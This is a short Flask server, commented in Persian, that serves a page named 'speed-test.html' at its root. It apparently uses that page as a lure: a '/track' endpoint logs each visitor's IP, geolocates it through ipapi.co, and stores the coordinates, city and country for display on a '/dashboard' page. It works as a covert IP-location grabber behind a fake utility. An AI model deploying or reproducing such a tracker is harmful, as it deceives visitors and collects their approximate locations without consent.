from flask import Flask, request, jsonify, send_from_directory
import os
import requests

app = Flask(__name__, static_folder='.')

# ذخیره مکان‌های دریافتی
locations = []

def get_location(ip):
    try:
        if ip in ['127.0.0.1', '::1'] or ip.startswith('192.168.') or ip.startswith('10.'):
            ip = '8.8.8.8'  # IP تست برای محیط لوکال
        url = f"https://ipapi.co/{ip}/json/"
        res = requests.get(url, timeout=3)
        data = res.json()
        return {
            "lat": data.get("latitude"),
            "lng": data.get("longitude"),
            "city": data.get("city", "ناشناخته"),
            "country": data.get("country_name", "ناشناخته")
        }
    except:
        return {"lat": 35.6892, "lng": 51.3890, "city": "خطا", "country": "ایران"}

@app.route('/track')
def track():
    # گرفتن IP واقعی کاربر
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers['X-Forwarded-For'].split(',')[0]
    else:
        ip = request.remote_addr

    loc = get_location(ip)
    if loc["lat"] and loc["lng"]:
        locations.append({
            "lat": loc["lat"],
            "lng": loc["lng"],
            "info": f"{loc['city']}, {loc['country']}"
        })
    return "", 204  # پاسخ خالی و سریع

@app.route('/data')
def get_data():
    return jsonify(locations)

@app.route('/dashboard')
def dashboard():
    return send_from_directory('.', 'dashboard.html')

@app.route('/')
def home():
    return send_from_directory('.', 'speed-test.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
